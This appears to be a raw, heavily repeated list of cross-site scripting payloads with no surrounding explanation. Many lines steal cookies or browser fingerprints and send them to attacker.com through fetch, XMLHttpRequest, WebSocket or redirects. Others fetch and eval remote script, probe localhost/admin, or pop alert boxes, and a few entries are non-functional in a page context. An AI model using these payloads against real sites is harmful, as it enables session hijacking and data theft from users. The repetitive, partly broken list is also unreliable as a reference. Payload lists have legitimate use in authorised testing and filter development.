<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<input name="location" value="<img src='x' onerror=alert(1)>">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<svg onload="alert(1)"></svg>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<div style="background-image: url('javascript:alert(1)')"></div>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<svg onload="alert(1)"></svg>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<div style="background-image: url('javascript:alert(1)')"></div>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<svg onload="alert(1)"></svg>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>navigator.serviceWorker.register('/sw.js');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<svg onload="alert(1)"></svg>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
